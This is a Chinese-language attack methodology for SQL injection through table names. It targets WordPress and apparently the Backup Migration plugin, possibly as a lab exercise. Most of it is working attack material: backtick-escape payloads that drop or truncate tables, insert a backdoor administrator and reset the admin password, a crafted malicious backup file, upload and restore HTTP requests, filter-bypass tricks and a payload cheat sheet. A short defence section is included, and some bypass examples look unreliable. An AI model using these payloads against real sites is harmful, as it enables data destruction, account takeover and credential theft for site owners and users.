# SQL 表名注入攻击方法论

## 1. 技术概述

### 1.1 漏洞原理

SQL 表名注入是一种特殊的 SQL 注入攻击，攻击者通过控制数据库查询中的表名参数（而非值参数）来执行恶意 SQL 代码。由于 SQL 标准不支持表名参数化查询，这类漏洞特别危险且难以防御。

**本质原因：**
- 表名/列名等标识符无法使用预编译语句的参数占位符
- 开发者直接拼接用户输入到 SQL 标识符位置
- 仅依赖反引号包裹但可被闭合绕过
- 从文件/备份中提取表名时未进行验证

### 1.2 常见漏洞模式

| 模式 | 描述 | 危险代码示例 |
|------|------|-------------|
| 备份文件表名提取 | 从 SQL 备份中提取表名直接使用 | `explode('`', $line)[1]` |
| 动态表名查询 | 用户指定表名进行查询 | `"SELECT * FROM " . $table` |
| 表名排序/过滤 | 按用户指定表名排序 | `"ORDER BY " . $column` |
| ALTER/DROP 操作 | 对动态表名执行结构变更 | `"ALTER TABLE " . $old . " RENAME TO " . $new` |

### 1.3 与常规 SQL 注入的区别

| 特征 | 常规 SQL 注入 | 表名 SQL 注入 |
|------|--------------|--------------|
| 注入位置 | WHERE 值参数 | FROM/INTO/ALTER 表名位置 |
| 参数化防御 | 有效 | 无效（表名无法参数化） |
| 反引号保护 | 不适用 | 可被闭合绕过 |
| 常见场景 | 搜索、登录、表单 | 备份恢复、动态查询、管理工具 |

---

## 2. 攻击场景

### 2.1 适用目标系统

| 系统特征 | 风险描述 |
|----------|----------|
| 数据库备份/恢复功能 | 解析 SQL 文件时提取表名 |
| 动态报表/查询工具 | 用户选择表进行查询 |
| 数据库管理工具 | phpMyAdmin 等管理界面 |
| 多租户 SaaS 系统 | 动态表名分隔数据 |
| WordPress 插件 | 备份迁移、数据库工具 |

### 2.2 典型业务场景

| 业务场景 | 功能示例 | 风险点 |
|----------|----------|--------|
| 数据库备份恢复 | 导入 SQL 备份文件 | 备份文件中恶意表名 |
| 数据导出工具 | 选择表导出 CSV | 表名参数可控 |
| 数据库迁移工具 | 表重命名/复制 | ALTER TABLE 注入 |
| 动态 ORM 查询 | 模型指定表名 | 表名未验证 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 输入点识别

关注以下功能点：
- 备份文件上传/导入
- 数据库表选择器
- 动态报表生成
- 数据导出功能
- 表管理操作（重命名、删除、复制）

#### 3.1.2 探测 Payload

**基础闭合测试：**
```sql
# 测试反引号闭合
`wp_posts`; --
`wp_posts`; SELECT 1; --

# 测试无保护场景
wp_posts; SELECT 1; --
```

**错误触发测试：**
```sql
# 故意制造语法错误
`; INVALID_KEYWORD; --

# 观察错误信息
`wp_posts`; SLEEP(5); --
```

**时间延迟测试：**
```sql
# MySQL 时间延迟
`; SELECT SLEEP(5); --

# 条件延迟
`; SELECT IF(1=1, SLEEP(5), 0); --
```

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

搜索以下危险模式：

```php
// 危险模式 1：备份文件表名提取
$realTableName = explode('`', $objFile->current())[1];
$wpdb->query('DESCRIBE ' . $table);

// 危险模式 2：直接拼接表名
$sql = "SELECT * FROM " . $_POST['table_name'];

// 危险模式 3：反引号但可闭合
$sql = "DROP TABLE IF EXISTS `" . $table . "`";

// 危险模式 4：ALTER/RENAME 操作
$sql = "ALTER TABLE `" . $oldTable . "` RENAME TO `" . $newTable . "`";
```

#### 3.2.2 数据流追踪

1. 定位表名来源（文件解析、用户输入、配置）
2. 检查是否有白名单验证
3. 追踪到 SQL 拼接点
4. 确认是否使用反引号及是否可闭合

---

## 4. 漏洞利用方法

### 4.1 基础利用技术

#### 4.1.1 反引号闭合绕过

**场景 1：有反引号包裹**
```sql
# 原始查询
SELECT * FROM `$user_input`

# Payload 闭合
user_input = wp_posts`; DROP TABLE wp_users; --

# 最终 SQL
SELECT * FROM `wp_posts`; DROP TABLE wp_users; --`
```

**场景 2：无反引号包裹**
```sql
# 原始查询
SELECT * FROM $user_input

# Payload
user_input = wp_posts; DROP TABLE wp_users; --

# 最终 SQL
SELECT * FROM wp_posts; DROP TABLE wp_users; --
```

#### 4.1.2 多语句注入

**MySQL 多语句支持：**
```sql
# 分号分隔多个语句
`; DROP TABLE wp_users; SELECT * FROM wp_posts; --

# 条件执行
`; INSERT INTO wp_users (user_login, user_pass) VALUES ('attacker', 'hash'); --
```

### 4.2 高级利用技术

#### 4.2.1 数据窃取

**UNION 查询注入：**
```sql
# 提取用户凭证
`; UNION SELECT user_login, user_pass, user_email FROM wp_users; --

# 提取配置信息
`; UNION SELECT option_name, option_value, 1 FROM wp_options WHERE option_name LIKE '%key%'; --
```

**INTO OUTFILE 导出：**
```sql
# 导出到文件
`; SELECT user_login, user_pass FROM wp_users INTO OUTFILE '/tmp/stolen.txt'; --
```

#### 4.2.2 权限提升

**创建管理员账户：**
```sql
# 插入新管理员
`; INSERT INTO wp_users (user_login, user_pass, user_email, user_status, display_name) 
   VALUES ('attacker', '$P$Bknownhash', 'attacker@evil.com', 0, 'attacker'); --

# 分配管理员角色
`; INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
   VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'); --
```

**修改现有密码：**
```sql
# 修改 admin 密码
`; UPDATE wp_users SET user_pass='$P$Bknownhash' WHERE user_login='admin'; --
```

#### 4.2.3 数据破坏

**删除关键表：**
```sql
# 删除用户表
`; DROP TABLE wp_users; --

# 删除配置表
`; DROP TABLE wp_options; --

# 级联删除
`; DROP TABLE IF EXISTS wp_users; DROP TABLE IF EXISTS wp_usermeta; --
```

**清空数据：**
```sql
# 清空所有数据
`; TRUNCATE TABLE wp_users; TRUNCATE TABLE wp_posts; --
```

#### 4.2.4 盲注技术

**布尔盲注：**
```sql
# 条件判断
`; SELECT CASE WHEN (SUBSTRING(user_pass,1,1)='$') THEN 1 ELSE 0 END FROM wp_users WHERE user_login='admin'; --

# 观察响应差异判断字符
```

**时间盲注：**
```sql
# 时间延迟判断
`; SELECT IF(SUBSTRING(user_pass,1,1)='$', SLEEP(5), 0) FROM wp_users WHERE user_login='admin'; --

# 逐字符提取密码
```

### 4.3 WordPress 备份恢复特定利用

#### 4.3.1 恶意备份文件构造

**备份文件格式：**
```sql
-- 恶意备份文件内容
-- WordPress Backup Migration Plugin Backup
-- Database: challenge

/* REAL_TABLE_NAME: `wp_posts`; DROP TABLE wp_users; --` */
CREATE TABLE IF NOT EXISTS `wp_posts`; DROP TABLE wp_users; --` (
    id INT PRIMARY KEY,
    post_content TEXT
);

INSERT INTO `wp_posts`; INSERT INTO wp_users (user_login, user_pass) VALUES ('attacker', '$P$Bhash'); --` 
VALUES (1, 'malicious content');
```

#### 4.3.2 利用流程

**步骤 1：创建恶意备份**
```bash
# 创建恶意 SQL 文件
cat > malicious.sql << 'EOF'
/* REAL_TABLE_NAME: `wp_posts`; DROP TABLE wp_users; --` */
CREATE TABLE IF NOT EXISTS `wp_posts`; DROP TABLE wp_users; --` (
    id INT PRIMARY KEY
);
EOF

# 打包为 ZIP
zip malicious.zip malicious.sql
```

**步骤 2：上传备份**
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Cookie: wordpress_[hash]=[session]
Content-Type: multipart/form-data

action=backup_migration&token=bmi&f=upload-backup&nonce=[nonce]
[File: malicious.zip]
```

**步骤 3：触发恢复**
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Cookie: wordpress_[hash]=[session]

action=backup_migration&token=bmi&f=restore-backup&nonce=[nonce]&file=malicious.zip
```

#### 4.3.3 INJ-VULN-05 模式（Search & Replace）

**注入位置：** 数据库搜索替换操作
**代码位置：** `even-better-restore-v4.php` + `search-replace.php`

**Payload：**
```sql
# 表名提取行格式
/* REAL_TABLE_NAME: `wp_posts`; DROP TABLE wp_users; --` */

# 执行效果
# 1. 提取 wp_posts 作为表名
# 2. 执行 DROP TABLE wp_users
# 3. 注释掉剩余内容
```

#### 4.3.4 INJ-VULN-06 模式（ALTER/DROP）

**注入位置：** 表重命名/删除操作
**代码位置：** `even-better-restore-v4.php` lines 168, 298, 301

**Payload：**
```sql
# DROP 操作注入（line 168）
$wpdb->query("DROP TABLE IF EXISTS `" . $tableName . "`;");

# Payload
tableName = wp_posts`; DELETE FROM wp_users WHERE user_login='admin'; --

# ALTER 操作注入（line 301）
$sql = "ALTER TABLE `" . $oldTable . "` RENAME TO `" . $newTable . "`;";

# Payload
oldTable = wp_posts`; DROP TABLE wp_options; --
newTable = wp_posts_backup
```

---

## 5. 绕过技术

### 5.1 反引号过滤绕过

**场景：反引号被过滤**
```sql
# 使用其他引号
wp_posts' OR '1'='1

# 使用空格
wp_posts WHERE 1=1

# 使用注释
wp_posts/*comment*/
```

### 5.2 关键词过滤绕过

**DROP 被过滤：**
```sql
# 使用双写
DDROPROP TABLE

# 使用注释
D/**/ROP TABLE

# 使用大小写
DrOp TaBlE
```

**TABLE 被过滤：**
```sql
# 使用同义词
DROP TABL.E

# 使用编码（某些场景）
DROP %54ABLE
```

### 5.3 分号过滤绕过

**分号被过滤：**
```sql
# 使用 UNION
`wp_posts` UNION SELECT 1,2,3--

# 使用 JOIN
`wp_posts` JOIN wp_users ON 1=1

# 使用子查询
`wp_posts` WHERE id=(SELECT 1 FROM wp_users LIMIT 1)
```

### 5.4 长度限制绕过

**表名长度限制：**
```sql
# 使用短 Payload
`; SELECT 1; --

# 使用注释缩短
`a`;/**/SELECT/**/1;--
```

---

## 6. 实战案例

### 6.1 WordPress Backup Migration 插件利用

**目标环境：**
- WordPress 6.5.4
- Backup Migration 插件 v1.3.5
- MySQL 8.0

**攻击步骤：**

**步骤 1：创建恶意备份文件**
```sql
-- 文件：malicious_backup.sql
-- 利用 INJ-VULN-06 模式

/* REAL_TABLE_NAME: `wp_posts_temp`; DROP TABLE wp_users; --` */
CREATE TABLE IF NOT EXISTS `wp_posts_temp`; DROP TABLE wp_users; --` (
    id INT PRIMARY KEY,
    post_title VARCHAR(255)
);

-- 插入测试数据
INSERT INTO `wp_posts_temp`; DROP TABLE wp_options; --` VALUES (1, 'test');
```

**步骤 2：打包并上传**
```bash
# 创建 manifest.json
cat > manifest.json << 'EOF'
{
    "backup_name": "malicious",
    "backup_timestamp": "2024-01-01 00:00:00",
    "site_url": "http://target.com",
    "database": "challenge"
}
EOF

# 打包
zip malicious.zip malicious_backup.sql manifest.json
```

**步骤 3：上传备份**
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Cookie: wordpress_[hash]=[session_cookie]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="action"

backup_migration
------WebKitFormBoundary
Content-Disposition: form-data; name="f"

upload-backup
------WebKitFormBoundary
Content-Disposition: form-data; name="file_data"; filename="malicious.zip"
Content-Type: application/zip

[ZIP file content]
------WebKitFormBoundary--
```

**步骤 4：触发恢复**
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Cookie: wordpress_[hash]=[session_cookie]

action=backup_migration&f=restore-backup&token=bmi&nonce=[nonce]&file=malicious.zip
```

**步骤 5：验证效果**
```bash
# 检查 wp_users 表是否被删除
docker exec mysql_container mysql -u wordpress -pwordpress -e "USE challenge; SHOW TABLES;"

# 或尝试登录 admin 账户验证
curl -X POST "http://target.com/wp-login.php" -d "log=admin&pwd=known_password"
```

### 6.2 权限提升完整利用链

```
1. 上传恶意备份文件
   ↓
2. 触发恢复操作（表名注入）
   ↓
3. 插入恶意管理员账户
   ↓
4. 使用新账户登录
   ↓
5. 获得完全管理员权限
```

**完整 Payload：**
```sql
-- 创建管理员账户
/* REAL_TABLE_NAME: `wp_posts`; 
INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, display_name, user_status) 
VALUES ('backdoor', '$P$Bknownhash', 'backdoor@evil.com', NOW(), 'backdoor', 0); 
INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
VALUES ((SELECT ID FROM wp_users WHERE user_login='backdoor'), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'); 
--` */
```

---

## 7. 检测与防御

### 7.1 检测指标

| 指标 | 检测方法 |
|------|----------|
| 异常 SQL 语法错误 | 监控 SQL 错误日志 |
| 多语句执行 | 检测 SQL 中的分号 |
| 敏感表操作 | 监控 DROP/ALTER/TRUNCATE |
| 异常数据修改 | 审计用户表/配置表变更 |

### 7.2 防御措施

**代码层面：**

```php
// 正确做法 1：白名单验证
$allowed_tables = ['wp_posts', 'wp_users', 'wp_options'];
if (!in_array($table_name, $allowed_tables, true)) {
    throw new Exception("Invalid table name");
}

// 正确做法 2：严格字符验证
if (!preg_match('/^[a-zA-Z0-9_]+$/', $table_name)) {
    throw new Exception("Invalid table name format");
}

// 正确做法 3：前缀验证
$expected_prefix = 'wp_';
if (strpos($table_name, $expected_prefix) !== 0) {
    throw new Exception("Table name must start with {$expected_prefix}");
}

// 正确做法 4：备份文件解析时验证
$realTableName = extract_table_name($line);
if (!validate_table_name($realTableName)) {
    log_error("Invalid table name in backup: {$realTableName}");
    continue; // 跳过无效表
}

function validate_table_name($name) {
    // 只允许字母、数字、下划线
    return preg_match('/^[a-zA-Z0-9_]+$/', $name);
}
```

**WordPress 特定修复：**

```php
// 使用 $wpdb->prepare() 处理值参数
// 但表名需要单独验证

// 错误做法
$wpdb->query("SELECT * FROM $table WHERE id = $id");

// 正确做法
$allowed_tables = ['posts', 'users', 'options'];
if (!in_array($table, $allowed_tables)) {
    return false;
}
$wpdb->query($wpdb->prepare("SELECT * FROM {$table} WHERE id = %d", $id));
```

---

## 8. Payload 速查表

### 8.1 基础注入 Payload

| 目的 | Payload |
|------|---------|
| 闭合反引号 | `` `; [SQL]; -- `` |
| 多语句注入 | `` `; DROP TABLE users; -- `` |
| UNION 查询 | `` ` UNION SELECT 1,2,3-- `` |
| 时间延迟 | `` `; SELECT SLEEP(5); -- `` |
| 布尔盲注 | `` `; SELECT IF(1=1,1,0); -- `` |

### 8.2 权限提升 Payload

```sql
-- 创建管理员
`; INSERT INTO wp_users (user_login, user_pass, user_email, display_name) 
   VALUES ('attacker', '$P$Bhash', 'a@b.com', 'attacker'); --

-- 分配角色
`; INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
   VALUES ((SELECT ID FROM wp_users WHERE user_login='attacker'), 
   'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'); --

-- 修改密码
`; UPDATE wp_users SET user_pass='$P$Bknownhash' WHERE user_login='admin'; --
```

### 8.3 数据破坏 Payload

```sql
-- 删除表
`; DROP TABLE wp_users; --
`; DROP TABLE wp_options; --

-- 清空数据
`; TRUNCATE TABLE wp_users; --
`; DELETE FROM wp_users; --

-- 级联破坏
`; DROP TABLE wp_users; DROP TABLE wp_posts; DROP TABLE wp_options; --
```

### 8.4 数据窃取 Payload

```sql
-- 提取用户凭证
`; UNION SELECT user_login, user_pass, user_email FROM wp_users; --

-- 提取配置
`; UNION SELECT option_name, option_value, 1 FROM wp_options; --

-- 导出到文件
`; SELECT * FROM wp_users INTO OUTFILE '/tmp/users.txt'; --
```

---

## 9. 参考资源

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [WordPress Database API](https://developer.wordpress.org/reference/classes/wpdb/)
- [MySQL Identifier Syntax](https://dev.mysql.com/doc/refman/8.0/en/identifiers.html)
